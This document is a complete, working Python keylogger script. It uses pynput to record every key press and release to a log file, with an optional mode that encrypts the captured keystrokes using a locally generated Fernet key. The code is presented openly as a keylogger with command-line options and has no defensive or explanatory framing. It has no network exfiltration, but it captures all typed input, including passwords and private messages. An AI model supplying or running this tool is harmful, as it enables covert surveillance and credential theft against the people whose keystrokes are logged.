import time
from pynput import keyboard
import argparse
from cryptography.fernet import Fernet

# Function to generate and save a key for encryption
def generate_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)
    return key

# Function to load the existing key
def load_key():
    return open("key.key", "rb").read()

# Function to encrypt the log data
def encrypt_log(data, key):
    fernet = Fernet(key)
    return fernet.encrypt(data.encode())

def keyPressed(key, logkey, encryption_key=None):
    try:
        if hasattr(key, 'char') and key.char is not None:
            char = key.char
        else:
            char = f'[{key}]'
        if encryption_key:
            char = encrypt_log(char, encryption_key).decode()  # decode to write string format
        logkey.write(char + '\n')
        logkey.flush()  # Ensure the log is written to file immediately
    except Exception as e:
        print(f"Error writing to file: {e}")

def keyReleased(key, logkey, encryption_key=None):
    try:
        char = f'[Released {key}]'
        if encryption_key:
            char = encrypt_log(char, encryption_key).decode()  # decode to write string format
        logkey.write(char + '\n')
        logkey.flush()  # Ensure the log is written to file immediately
    except Exception as e:
        print(f"Error writing to file: {e}")

def main(log_file_path, encrypt=False):
    encryption_key = None
    if encrypt:
        try:
            encryption_key = load_key()
        except FileNotFoundError:
            encryption_key = generate_key()

    with open(log_file_path, 'a') as logkey:
        start_msg = f"Keylogging started at {time.ctime()}\n"
        if encryption_key:
            start_msg = encrypt_log(start_msg, encryption_key).decode()
        logkey.write(start_msg)
        logkey.flush()  # Ensure the log is written to file immediately
        
        listener = keyboard.Listener(
            on_press=lambda key: keyPressed(key, logkey, encryption_key),
            on_release=lambda key: keyReleased(key, logkey, encryption_key)
        )
        listener.start()
        
        try:
            listener.join()
        except KeyboardInterrupt:
            stop_msg = f"Keylogging stopped at {time.ctime()}\n"
            if encryption_key:
                stop_msg = encrypt_log(stop_msg, encryption_key).decode()
            logkey.write(stop_msg)
            logkey.flush()  # Ensure the log is written to file immediately
            print("Keylogging stopped.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Keylogger script with encryption support.")
    parser.add_argument('-f', '--file', type=str, default='keylog.txt', help='The path to the log file.')
    parser.add_argument('-e', '--encrypt', action='store_true', help='Encrypt the log file.')
    
    args = parser.parse_args()
    main(args.file, args.encrypt)
